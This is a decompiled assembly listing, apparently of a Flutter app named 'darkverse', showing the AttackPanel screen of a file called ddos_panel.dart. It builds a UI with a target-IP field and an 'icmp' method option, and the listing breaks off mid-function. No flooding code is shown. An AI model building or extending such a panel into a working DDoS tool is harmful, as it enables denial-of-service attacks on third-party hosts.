// lib: , url: package:darkverse/ddos_panel.dart

// class id: 1048745, size: 0x8
class :: {
}

// class id: 3696, size: 0x14, field offset: 0xc
//   const constructor, 
class AttackPanel extends StatefulWidget {

  _ createState(/* No info */) {
    // ** addr: 0x9e157c, size: 0x48
    // 0x9e157c: EnterFrame
    //     0x9e157c: stp             fp, lr, [SP, #-0x10]!
    //     0x9e1580: mov             fp, SP
    // 0x9e1584: AllocStack(0x8)
    //     0x9e1584: sub             SP, SP, #8
    // 0x9e1588: CheckStackOverflow
    //     0x9e1588: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9e158c: cmp             SP, x16
    //     0x9e1590: b.ls            #0x9e15bc
    // 0x9e1594: r1 = <AttackPanel>
    //     0x9e1594: add             x1, PP, #0x34, lsl #12  ; [pp+0x34b08] TypeArguments: <AttackPanel>
    //     0x9e1598: ldr             x1, [x1, #0xb08]
    // 0x9e159c: r0 = _AttackPanelState()
    //     0x9e159c: bl              #0x9e1710  ; Allocate_AttackPanelStateStub -> _AttackPanelState (size=0x48)
    // 0x9e15a0: mov             x1, x0
    // 0x9e15a4: stur            x0, [fp, #-8]
    // 0x9e15a8: r0 = _AttackPanelState()
    //     0x9e15a8: bl              #0x9e15c4  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_AttackPanelState
    // 0x9e15ac: ldur            x0, [fp, #-8]
    // 0x9e15b0: LeaveFrame
    //     0x9e15b0: mov             SP, fp
    //     0x9e15b4: ldp             fp, lr, [SP], #0x10
    // 0x9e15b8: ret
    //     0x9e15b8: ret             
    // 0x9e15bc: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9e15bc: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9e15c0: b               #0x9e1594
  }
}

// class id: 4167, size: 0x48, field offset: 0x1c
class _AttackPanelState extends _MixinApplication283&State&TickerProviderStateMixin {

  late AnimationController _controller; // offset: 0x28

  _ build(/* No info */) {
    // ** addr: 0x804818, size: 0xe08
    // 0x804818: EnterFrame
    //     0x804818: stp             fp, lr, [SP, #-0x10]!
    //     0x80481c: mov             fp, SP
    // 0x804820: AllocStack(0x78)
    //     0x804820: sub             SP, SP, #0x78
    // 0x804824: SetupParameters(_AttackPanelState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */)
    //     0x804824: stur            x1, [fp, #-8]
    //     0x804828: stur            x2, [fp, #-0x10]
    // 0x80482c: CheckStackOverflow
    //     0x80482c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x804830: cmp             SP, x16
    //     0x804834: b.ls            #0x8055b8
    // 0x804838: r1 = 1
    //     0x804838: mov             x1, #1
    // 0x80483c: r0 = AllocateContext()
    //     0x80483c: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x804840: ldur            x1, [fp, #-8]
    // 0x804844: stur            x0, [fp, #-0x18]
    // 0x804848: StoreField: r0->field_f = r1
    //     0x804848: stur            w1, [x0, #0xf]
    // 0x80484c: r16 = <ThemeProvider>
    //     0x80484c: ldr             x16, [PP, #0x6dd8]  ; [pp+0x6dd8] TypeArguments: <ThemeProvider>
    // 0x804850: ldur            lr, [fp, #-0x10]
    // 0x804854: stp             lr, x16, [SP]
    // 0x804858: r4 = const [0x1, 0x1, 0x1, 0x1, null]
    //     0x804858: ldr             x4, [PP, #0xde8]  ; [pp+0xde8] List(5) [0x1, 0x1, 0x1, 0x1, Null]
    // 0x80485c: r0 = of()
    //     0x80485c: bl              #0x6a7cb0  ; [package:provider/src/provider.dart] Provider::of
    // 0x804860: ldur            x1, [fp, #-8]
    // 0x804864: LoadField: r0 = r1->field_2b
    //     0x804864: ldur            w0, [x1, #0x2b]
    // 0x804868: DecompressPointer r0
    //     0x804868: add             x0, x0, HEAP, lsl #32
    // 0x80486c: r2 = LoadClassIdInstr(r0)
    //     0x80486c: ldur            x2, [x0, #-1]
    //     0x804870: ubfx            x2, x2, #0xc, #0x14
    // 0x804874: str             x0, [SP]
    // 0x804878: mov             x0, x2
    // 0x80487c: r0 = GDT[cid_x0 + -0xffc]()
    //     0x80487c: sub             lr, x0, #0xffc
    //     0x804880: ldr             lr, [x21, lr, lsl #3]
    //     0x804884: blr             lr
    // 0x804888: r1 = LoadClassIdInstr(r0)
    //     0x804888: ldur            x1, [x0, #-1]
    //     0x80488c: ubfx            x1, x1, #0xc, #0x14
    // 0x804890: r16 = "icmp"
    //     0x804890: add             x16, PP, #0x3e, lsl #12  ; [pp+0x3e968] "icmp"
    //     0x804894: ldr             x16, [x16, #0x968]
    // 0x804898: stp             x16, x0, [SP]
    // 0x80489c: mov             x0, x1
    // 0x8048a0: mov             lr, x0
    // 0x8048a4: ldr             lr, [x21, lr, lsl #3]
    // 0x8048a8: blr             lr
    // 0x8048ac: stur            x0, [fp, #-0x10]
    // 0x8048b0: r0 = AppBar()
    //     0x8048b0: bl              #0x5fadf4  ; AllocateAppBarStub -> AppBar (size=0x98)
    // 0x8048b4: stur            x0, [fp, #-0x20]
    // 0x8048b8: r16 = Instance_Color
    //     0x8048b8: add             x16, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x8048bc: ldr             x16, [x16, #0xdc0]
    // 0x8048c0: r30 = 0.000000
    //     0x8048c0: ldr             lr, [PP, #0x4910]  ; [pp+0x4910] 0
    // 0x8048c4: stp             lr, x16, [SP, #0x10]
    // 0x8048c8: r16 = Instance_Text
    //     0x8048c8: add             x16, PP, #0x40, lsl #12  ; [pp+0x40ed8] Obj!Text@a2e481
    //     0x8048cc: ldr             x16, [x16, #0xed8]
    // 0x8048d0: r30 = true
    //     0x8048d0: add             lr, NULL, #0x20  ; true
    // 0x8048d4: stp             lr, x16, [SP]
    // 0x8048d8: mov             x1, x0
    // 0x8048dc: r4 = const [0, 0x5, 0x4, 0x1, backgroundColor, 0x1, centerTitle, 0x4, elevation, 0x2, title, 0x3, null]
    //     0x8048dc: add             x4, PP, #0x40, lsl #12  ; [pp+0x40ee0] List(13) [0, 0x5, 0x4, 0x1, "backgroundColor", 0x1, "centerTitle", 0x4, "elevation", 0x2, "title", 0x3, Null]
    //     0x8048e0: ldr             x4, [x4, #0xee0]
    // 0x8048e4: r0 = AppBar()
    //     0x8048e4: bl              #0x5fa308  ; [package:flutter/src/material/app_bar.dart] AppBar::AppBar
    // 0x8048e8: r1 = <double>
    //     0x8048e8: ldr             x1, [PP, #0x41e0]  ; [pp+0x41e0] TypeArguments: <double>
    // 0x8048ec: r0 = Tween()
    //     0x8048ec: bl              #0x4ff048  ; AllocateTweenStub -> Tween<X0> (size=0x14)
    // 0x8048f0: mov             x1, x0
    // 0x8048f4: r0 = 0.500000
    //     0x8048f4: ldr             x0, [PP, #0x4958]  ; [pp+0x4958] 0.5
    // 0x8048f8: StoreField: r1->field_b = r0
    //     0x8048f8: stur            w0, [x1, #0xb]
    // 0x8048fc: r0 = 1.000000
    //     0x8048fc: ldr             x0, [PP, #0x4948]  ; [pp+0x4948] 1
    // 0x804900: StoreField: r1->field_f = r0
    //     0x804900: stur            w0, [x1, #0xf]
    // 0x804904: ldur            x0, [fp, #-8]
    // 0x804908: LoadField: r2 = r0->field_27
    //     0x804908: ldur            w2, [x0, #0x27]
    // 0x80490c: DecompressPointer r2
    //     0x80490c: add             x2, x2, HEAP, lsl #32
    // 0x804910: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x804914: cmp             w2, w16
    // 0x804918: b.eq            #0x8055c0
    // 0x80491c: r0 = animate()
    //     0x80491c: bl              #0x4fef4c  ; [package:flutter/src/animation/tween.dart] Animatable::animate
    // 0x804920: stur            x0, [fp, #-0x28]
    // 0x804924: r0 = Image()
    //     0x804924: bl              #0x6a8b34  ; AllocateImageStub -> Image (size=0x58)
    // 0x804928: stur            x0, [fp, #-0x30]
    // 0x80492c: r16 = 120.000000
    //     0x80492c: add             x16, PP, #0x1a, lsl #12  ; [pp+0x1aaf0] 120
    //     0x804930: ldr             x16, [x16, #0xaf0]
    // 0x804934: r30 = 120.000000
    //     0x804934: add             lr, PP, #0x1a, lsl #12  ; [pp+0x1aaf0] 120
    //     0x804938: ldr             lr, [lr, #0xaf0]
    // 0x80493c: stp             lr, x16, [SP]
    // 0x804940: mov             x1, x0
    // 0x804944: r2 = "assets/images/logo.png"
    //     0x804944: add             x2, PP, #0x40, lsl #12  ; [pp+0x40ee8] "assets/images/logo.png"
    //     0x804948: ldr             x2, [x2, #0xee8]
    // 0x80494c: r4 = const [0, 0x4, 0x2, 0x2, height, 0x3, width, 0x2, null]
    //     0x80494c: add             x4, PP, #0x15, lsl #12  ; [pp+0x15878] List(9) [0, 0x4, 0x2, 0x2, "height", 0x3, "width", 0x2, Null]
    //     0x804950: ldr             x4, [x4, #0x878]
    // 0x804954: r0 = Image.asset()
    //     0x804954: bl              #0x6a88b4  ; [package:flutter/src/widgets/image.dart] Image::Image.asset
    // 0x804958: r0 = ClipOval()
    //     0x804958: bl              #0x6cb530  ; AllocateClipOvalStub -> ClipOval (size=0x18)
    // 0x80495c: mov             x1, x0
    // 0x804960: r0 = Instance_Clip
    //     0x804960: add             x0, PP, #0xc, lsl #12  ; [pp+0xccb8] Obj!Clip@a43da1
    //     0x804964: ldr             x0, [x0, #0xcb8]
    // 0x804968: stur            x1, [fp, #-0x38]
    // 0x80496c: StoreField: r1->field_13 = r0
    //     0x80496c: stur            w0, [x1, #0x13]
    // 0x804970: ldur            x0, [fp, #-0x30]
    // 0x804974: StoreField: r1->field_b = r0
    //     0x804974: stur            w0, [x1, #0xb]
    // 0x804978: r0 = FadeTransition()
    //     0x804978: bl              #0x4fea94  ; AllocateFadeTransitionStub -> FadeTransition (size=0x18)
    // 0x80497c: mov             x3, x0
    // 0x804980: ldur            x0, [fp, #-0x28]
    // 0x804984: stur            x3, [fp, #-0x30]
    // 0x804988: StoreField: r3->field_f = r0
    //     0x804988: stur            w0, [x3, #0xf]
    // 0x80498c: r0 = false
    //     0x80498c: add             x0, NULL, #0x30  ; false
    // 0x804990: StoreField: r3->field_13 = r0
    //     0x804990: stur            w0, [x3, #0x13]
    // 0x804994: ldur            x1, [fp, #-0x38]
    // 0x804998: StoreField: r3->field_b = r1
    //     0x804998: stur            w1, [x3, #0xb]
    // 0x80499c: r1 = <Widget>
    //     0x80499c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8049a0: r2 = 28
    //     0x8049a0: mov             x2, #0x1c
    // 0x8049a4: r0 = AllocateArray()
    //     0x8049a4: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8049a8: mov             x1, x0
    // 0x8049ac: ldur            x0, [fp, #-0x30]
    // 0x8049b0: stur            x1, [fp, #-0x38]
    // 0x8049b4: StoreField: r1->field_f = r0
    //     0x8049b4: stur            w0, [x1, #0xf]
    // 0x8049b8: r16 = Instance_SizedBox
    //     0x8049b8: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x8049bc: ldr             x16, [x16, #0x5b0]
    // 0x8049c0: StoreField: r1->field_13 = r16
    //     0x8049c0: stur            w16, [x1, #0x13]
    // 0x8049c4: ldur            x0, [fp, #-8]
    // 0x8049c8: LoadField: r2 = r0->field_3b
    //     0x8049c8: ldur            w2, [x0, #0x3b]
    // 0x8049cc: DecompressPointer r2
    //     0x8049cc: add             x2, x2, HEAP, lsl #32
    // 0x8049d0: stur            x2, [fp, #-0x28]
    // 0x8049d4: r0 = TextStyle()
    //     0x8049d4: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x8049d8: mov             x1, x0
    // 0x8049dc: r0 = true
    //     0x8049dc: add             x0, NULL, #0x20  ; true
    // 0x8049e0: stur            x1, [fp, #-0x30]
    // 0x8049e4: StoreField: r1->field_7 = r0
    //     0x8049e4: stur            w0, [x1, #7]
    // 0x8049e8: ldur            x2, [fp, #-0x28]
    // 0x8049ec: StoreField: r1->field_b = r2
    //     0x8049ec: stur            w2, [x1, #0xb]
    // 0x8049f0: r3 = 18.000000
    //     0x8049f0: add             x3, PP, #0xd, lsl #12  ; [pp+0xdc60] 18
    //     0x8049f4: ldr             x3, [x3, #0xc60]
    // 0x8049f8: StoreField: r1->field_1f = r3
    //     0x8049f8: stur            w3, [x1, #0x1f]
    // 0x8049fc: r3 = Instance_FontWeight
    //     0x8049fc: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x804a00: ldr             x3, [x3, #0xf08]
    // 0x804a04: StoreField: r1->field_23 = r3
    //     0x804a04: stur            w3, [x1, #0x23]
    // 0x804a08: r4 = "Orbitron"
    //     0x804a08: add             x4, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x804a0c: ldr             x4, [x4, #0xf20]
    // 0x804a10: StoreField: r1->field_13 = r4
    //     0x804a10: stur            w4, [x1, #0x13]
    // 0x804a14: r0 = Text()
    //     0x804a14: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x804a18: mov             x1, x0
    // 0x804a1c: r0 = "Target Input & Methods"
    //     0x804a1c: add             x0, PP, #0x40, lsl #12  ; [pp+0x40ef0] "Target Input & Methods"
    //     0x804a20: ldr             x0, [x0, #0xef0]
    // 0x804a24: StoreField: r1->field_b = r0
    //     0x804a24: stur            w0, [x1, #0xb]
    // 0x804a28: ldur            x0, [fp, #-0x30]
    // 0x804a2c: StoreField: r1->field_13 = r0
    //     0x804a2c: stur            w0, [x1, #0x13]
    // 0x804a30: mov             x0, x1
    // 0x804a34: ldur            x1, [fp, #-0x38]
    // 0x804a38: ArrayStore: r1[2] = r0  ; List_4
    //     0x804a38: add             x25, x1, #0x17
    //     0x804a3c: str             w0, [x25]
    //     0x804a40: tbz             w0, #0, #0x804a5c
    //     0x804a44: ldurb           w16, [x1, #-1]
    //     0x804a48: ldurb           w17, [x0, #-1]
    //     0x804a4c: and             x16, x17, x16, lsr #2
    //     0x804a50: tst             x16, HEAP, lsr #32
    //     0x804a54: b.eq            #0x804a5c
    //     0x804a58: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x804a5c: r0 = Divider()
    //     0x804a5c: bl              #0x805ffc  ; AllocateDividerStub -> Divider (size=0x24)
    // 0x804a60: mov             x1, x0
    // 0x804a64: r0 = 0.600000
    //     0x804a64: add             x0, PP, #0x14, lsl #12  ; [pp+0x14db8] 0.6
    //     0x804a68: ldr             x0, [x0, #0xdb8]
    // 0x804a6c: StoreField: r1->field_f = r0
    //     0x804a6c: stur            w0, [x1, #0xf]
    // 0x804a70: r2 = Instance_Color
    //     0x804a70: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x804a74: ldr             x2, [x2, #0xf80]
    // 0x804a78: StoreField: r1->field_1f = r2
    //     0x804a78: stur            w2, [x1, #0x1f]
    // 0x804a7c: mov             x0, x1
    // 0x804a80: ldur            x1, [fp, #-0x38]
    // 0x804a84: ArrayStore: r1[3] = r0  ; List_4
    //     0x804a84: add             x25, x1, #0x1b
    //     0x804a88: str             w0, [x25]
    //     0x804a8c: tbz             w0, #0, #0x804aa8
    //     0x804a90: ldurb           w16, [x1, #-1]
    //     0x804a94: ldurb           w17, [x0, #-1]
    //     0x804a98: and             x16, x17, x16, lsr #2
    //     0x804a9c: tst             x16, HEAP, lsr #32
    //     0x804aa0: b.eq            #0x804aa8
    //     0x804aa4: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x804aa8: ldur            x1, [fp, #-0x38]
    // 0x804aac: r16 = Instance_SizedBox
    //     0x804aac: add             x16, PP, #0x25, lsl #12  ; [pp+0x25720] Obj!SizedBox@a3ad01
    //     0x804ab0: ldr             x16, [x16, #0x720]
    // 0x804ab4: StoreField: r1->field_1f = r16
    //     0x804ab4: stur            w16, [x1, #0x1f]
    // 0x804ab8: ldur            x0, [fp, #-8]
    // 0x804abc: LoadField: r3 = r0->field_1b
    //     0x804abc: ldur            w3, [x0, #0x1b]
    // 0x804ac0: DecompressPointer r3
    //     0x804ac0: add             x3, x3, HEAP, lsl #32
    // 0x804ac4: stur            x3, [fp, #-0x30]
    // 0x804ac8: r0 = TextStyle()
    //     0x804ac8: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x804acc: mov             x3, x0
    // 0x804ad0: r0 = true
    //     0x804ad0: add             x0, NULL, #0x20  ; true
    // 0x804ad4: stur            x3, [fp, #-0x40]
    // 0x804ad8: StoreField: r3->field_7 = r0
    //     0x804ad8: stur            w0, [x3, #7]
    // 0x804adc: ldur            x4, [fp, #-0x28]
    // 0x804ae0: StoreField: r3->field_b = r4
    //     0x804ae0: stur            w4, [x3, #0xb]
    // 0x804ae4: ldur            x1, [fp, #-8]
    // 0x804ae8: r2 = "Target IP (e.g. 1.1.1.1)"
    //     0x804ae8: add             x2, PP, #0x40, lsl #12  ; [pp+0x40ef8] "Target IP (e.g. 1.1.1.1)"
    //     0x804aec: ldr             x2, [x2, #0xef8]
    // 0x804af0: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x804af0: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x804af4: r0 = _inputStyle()
    //     0x804af4: bl              #0x805cc4  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_inputStyle
    // 0x804af8: stur            x0, [fp, #-0x48]
    // 0x804afc: r0 = TextField()
    //     0x804afc: bl              #0x6dd5b4  ; AllocateTextFieldStub -> TextField (size=0x128)
    // 0x804b00: mov             x1, x0
    // 0x804b04: r0 = EditableText
    //     0x804b04: ldr             x0, [PP, #0x50a0]  ; [pp+0x50a0] Type: EditableText
    // 0x804b08: StoreField: r1->field_f = r0
    //     0x804b08: stur            w0, [x1, #0xf]
    // 0x804b0c: ldur            x2, [fp, #-0x30]
    // 0x804b10: StoreField: r1->field_13 = r2
    //     0x804b10: stur            w2, [x1, #0x13]
    // 0x804b14: ldur            x2, [fp, #-0x48]
    // 0x804b18: StoreField: r1->field_1b = r2
    //     0x804b18: stur            w2, [x1, #0x1b]
    // 0x804b1c: r4 = Instance_TextCapitalization
    //     0x804b1c: add             x4, PP, #0x14, lsl #12  ; [pp+0x149e0] Obj!TextCapitalization@a3f5e1
    //     0x804b20: ldr             x4, [x4, #0x9e0]
    // 0x804b24: StoreField: r1->field_27 = r4
    //     0x804b24: stur            w4, [x1, #0x27]
    // 0x804b28: ldur            x2, [fp, #-0x40]
    // 0x804b2c: StoreField: r1->field_2b = r2
    //     0x804b2c: stur            w2, [x1, #0x2b]
    // 0x804b30: r6 = Instance_TextAlign
    //     0x804b30: ldr             x6, [PP, #0x4960]  ; [pp+0x4960] Obj!TextAlign@a43321
    // 0x804b34: StoreField: r1->field_33 = r6
    //     0x804b34: stur            w6, [x1, #0x33]
    // 0x804b38: r7 = false
    //     0x804b38: add             x7, NULL, #0x30  ; false
    // 0x804b3c: StoreField: r1->field_6b = r7
    //     0x804b3c: stur            w7, [x1, #0x6b]
    // 0x804b40: StoreField: r1->field_3f = r7
    //     0x804b40: stur            w7, [x1, #0x3f]
    // 0x804b44: r8 = "•"
    //     0x804b44: add             x8, PP, #0x14, lsl #12  ; [pp+0x149e8] "•"
    //     0x804b48: ldr             x8, [x8, #0x9e8]
    // 0x804b4c: StoreField: r1->field_47 = r8
    //     0x804b4c: stur            w8, [x1, #0x47]
    // 0x804b50: StoreField: r1->field_4b = r7
    //     0x804b50: stur            w7, [x1, #0x4b]
    // 0x804b54: r9 = true
    //     0x804b54: add             x9, NULL, #0x20  ; true
    // 0x804b58: StoreField: r1->field_5b = r9
    //     0x804b58: stur            w9, [x1, #0x5b]
    // 0x804b5c: r10 = 2
    //     0x804b5c: mov             x10, #2
    // 0x804b60: StoreField: r1->field_5f = r10
    //     0x804b60: stur            w10, [x1, #0x5f]
    // 0x804b64: StoreField: r1->field_67 = r7
    //     0x804b64: stur            w7, [x1, #0x67]
    // 0x804b68: d0 = 2.000000
    //     0x804b68: fmov            d0, #2.00000000
    // 0x804b6c: StoreField: r1->field_9b = d0
    //     0x804b6c: stur            d0, [x1, #0x9b]
    // 0x804b70: r11 = Instance_Color
    //     0x804b70: add             x11, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x804b74: ldr             x11, [x11, #0xf80]
    // 0x804b78: StoreField: r1->field_af = r11
    //     0x804b78: stur            w11, [x1, #0xaf]
    // 0x804b7c: r12 = Instance_EdgeInsets
    //     0x804b7c: ldr             x12, [PP, #0x5348]  ; [pp+0x5348] Obj!EdgeInsets@a05fc1
    // 0x804b80: StoreField: r1->field_c3 = r12
    //     0x804b80: stur            w12, [x1, #0xc3]
    // 0x804b84: r13 = Instance_DragStartBehavior
    //     0x804b84: ldr             x13, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x804b88: StoreField: r1->field_d3 = r13
    //     0x804b88: stur            w13, [x1, #0xd3]
    // 0x804b8c: StoreField: r1->field_db = r7
    //     0x804b8c: stur            w7, [x1, #0xdb]
    // 0x804b90: r14 = const []
    //     0x804b90: ldr             x14, [PP, #0x5e68]  ; [pp+0x5e68] List<String>(0)
    // 0x804b94: StoreField: r1->field_f7 = r14
    //     0x804b94: stur            w14, [x1, #0xf7]
    // 0x804b98: r19 = Instance_Clip
    //     0x804b98: add             x19, PP, #0xc, lsl #12  ; [pp+0xca18] Obj!Clip@a43d61
    //     0x804b9c: ldr             x19, [x19, #0xa18]
    // 0x804ba0: StoreField: r1->field_fb = r19
    //     0x804ba0: stur            w19, [x1, #0xfb]
    // 0x804ba4: r17 = 259
    //     0x804ba4: mov             x17, #0x103
    // 0x804ba8: str             w9, [x1, x17]
    // 0x804bac: r17 = 263
    //     0x804bac: mov             x17, #0x107
    // 0x804bb0: str             w9, [x1, x17]
    // 0x804bb4: r17 = 267
    //     0x804bb4: mov             x17, #0x10b
    // 0x804bb8: str             w9, [x1, x17]
    // 0x804bbc: r20 = Closure: (BuildContext, EditableTextState) => Widget from Function '_defaultContextMenuBuilder@127181401': static.
    //     0x804bbc: add             x20, PP, #0x14, lsl #12  ; [pp+0x149f8] Closure: (BuildContext, EditableTextState) => Widget from Function '_defaultContextMenuBuilder@127181401': static. (0x75b33a6e60)
    //     0x804bc0: ldr             x20, [x20, #0x9f8]
    // 0x804bc4: r17 = 275
    //     0x804bc4: mov             x17, #0x113
    // 0x804bc8: str             w20, [x1, x17]
    // 0x804bcc: r17 = 279
    //     0x804bcc: mov             x17, #0x117
    // 0x804bd0: str             w9, [x1, x17]
    // 0x804bd4: r23 = Instance_SmartDashesType
    //     0x804bd4: add             x23, PP, #0x14, lsl #12  ; [pp+0x14a00] Obj!SmartDashesType@a3f821
    //     0x804bd8: ldr             x23, [x23, #0xa00]
    // 0x804bdc: StoreField: r1->field_53 = r23
    //     0x804bdc: stur            w23, [x1, #0x53]
    // 0x804be0: r24 = Instance_SmartQuotesType
    //     0x804be0: add             x24, PP, #0x14, lsl #12  ; [pp+0x14a08] Obj!SmartQuotesType@a3f7e1
    //     0x804be4: ldr             x24, [x24, #0xa08]
    // 0x804be8: StoreField: r1->field_57 = r24
    //     0x804be8: stur            w24, [x1, #0x57]
    // 0x804bec: r2 = Instance_TextInputType
    //     0x804bec: add             x2, PP, #0xf, lsl #12  ; [pp+0xfa70] Obj!TextInputType@a044f1
    //     0x804bf0: ldr             x2, [x2, #0xa70]
    // 0x804bf4: StoreField: r1->field_1f = r2
    //     0x804bf4: stur            w2, [x1, #0x1f]
    // 0x804bf8: StoreField: r1->field_c7 = r9
    //     0x804bf8: stur            w9, [x1, #0xc7]
    // 0x804bfc: mov             x2, x1
    // 0x804c00: ldur            x1, [fp, #-8]
    // 0x804c04: r3 = Instance_IconData
    //     0x804c04: add             x3, PP, #0x40, lsl #12  ; [pp+0x40f00] Obj!IconData@a023a1
    //     0x804c08: ldr             x3, [x3, #0xf00]
    // 0x804c0c: r5 = "Target IP"
    //     0x804c0c: add             x5, PP, #0x40, lsl #12  ; [pp+0x40f08] "Target IP"
    //     0x804c10: ldr             x5, [x5, #0xf08]
    // 0x804c14: r0 = _buildInputCard()
    //     0x804c14: bl              #0x805970  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_buildInputCard
    // 0x804c18: ldur            x1, [fp, #-0x38]
    // 0x804c1c: ArrayStore: r1[5] = r0  ; List_4
    //     0x804c1c: add             x25, x1, #0x23
    //     0x804c20: str             w0, [x25]
    //     0x804c24: tbz             w0, #0, #0x804c40
    //     0x804c28: ldurb           w16, [x1, #-1]
    //     0x804c2c: ldurb           w17, [x0, #-1]
    //     0x804c30: and             x16, x17, x16, lsr #2
    //     0x804c34: tst             x16, HEAP, lsr #32
    //     0x804c38: b.eq            #0x804c40
    //     0x804c3c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x804c40: ldur            x1, [fp, #-0x38]
    // 0x804c44: r16 = Instance_SizedBox
    //     0x804c44: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x804c48: ldr             x16, [x16, #0x5b0]
    // 0x804c4c: StoreField: r1->field_27 = r16
    //     0x804c4c: stur            w16, [x1, #0x27]
    // 0x804c50: ldur            x0, [fp, #-8]
    // 0x804c54: LoadField: r2 = r0->field_1f
    //     0x804c54: ldur            w2, [x0, #0x1f]
    // 0x804c58: DecompressPointer r2
    //     0x804c58: add             x2, x2, HEAP, lsl #32
    // 0x804c5c: ldur            x3, [fp, #-0x10]
    // 0x804c60: stur            x2, [fp, #-0x40]
    // 0x804c64: eor             x4, x3, #0x10
    // 0x804c68: stur            x4, [fp, #-0x30]
    // 0x804c6c: tbnz            w3, #4, #0x804cb4
    // 0x804c70: r0 = Color()
    //     0x804c70: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x804c74: mov             x1, x0
    // 0x804c78: r0 = Instance_ColorSpace
    //     0x804c78: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x804c7c: StoreField: r1->field_27 = r0
    //     0x804c7c: stur            w0, [x1, #0x27]
    // 0x804c80: d0 = 1.000000
    //     0x804c80: fmov            d0, #1.00000000
    // 0x804c84: StoreField: r1->field_7 = d0
    //     0x804c84: stur            d0, [x1, #7]
    // 0x804c88: d1 = 0.882353
    //     0x804c88: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x804c8c: ldr             d1, [x17, #0x468]
    // 0x804c90: StoreField: r1->field_f = d1
    //     0x804c90: stur            d1, [x1, #0xf]
    // 0x804c94: d2 = 0.501961
    //     0x804c94: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x804c98: ldr             d2, [x17, #0x470]
    // 0x804c9c: ArrayStore: r1[0] = d2  ; List_8
    //     0x804c9c: stur            d2, [x1, #0x17]
    // 0x804ca0: d3 = 0.490196
    //     0x804ca0: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x804ca4: ldr             d3, [x17, #0x478]
    // 0x804ca8: StoreField: r1->field_1f = d3
    //     0x804ca8: stur            d3, [x1, #0x1f]
    // 0x804cac: mov             x2, x1
    // 0x804cb0: b               #0x804cd8
    // 0x804cb4: d0 = 1.000000
    //     0x804cb4: fmov            d0, #1.00000000
    // 0x804cb8: r0 = Instance_ColorSpace
    //     0x804cb8: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x804cbc: d1 = 0.882353
    //     0x804cbc: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x804cc0: ldr             d1, [x17, #0x468]
    // 0x804cc4: d2 = 0.501961
    //     0x804cc4: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x804cc8: ldr             d2, [x17, #0x470]
    // 0x804ccc: d3 = 0.490196
    //     0x804ccc: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x804cd0: ldr             d3, [x17, #0x478]
    // 0x804cd4: ldur            x2, [fp, #-0x28]
    // 0x804cd8: ldur            x1, [fp, #-0x10]
    // 0x804cdc: stur            x2, [fp, #-0x48]
    // 0x804ce0: r0 = TextStyle()
    //     0x804ce0: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x804ce4: mov             x1, x0
    // 0x804ce8: r0 = true
    //     0x804ce8: add             x0, NULL, #0x20  ; true
    // 0x804cec: stur            x1, [fp, #-0x50]
    // 0x804cf0: StoreField: r1->field_7 = r0
    //     0x804cf0: stur            w0, [x1, #7]
    // 0x804cf4: ldur            x2, [fp, #-0x48]
    // 0x804cf8: StoreField: r1->field_b = r2
    //     0x804cf8: stur            w2, [x1, #0xb]
    // 0x804cfc: ldur            x2, [fp, #-0x10]
    // 0x804d00: tbnz            w2, #4, #0x804d48
    // 0x804d04: r0 = Color()
    //     0x804d04: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x804d08: mov             x1, x0
    // 0x804d0c: r0 = Instance_ColorSpace
    //     0x804d0c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x804d10: StoreField: r1->field_27 = r0
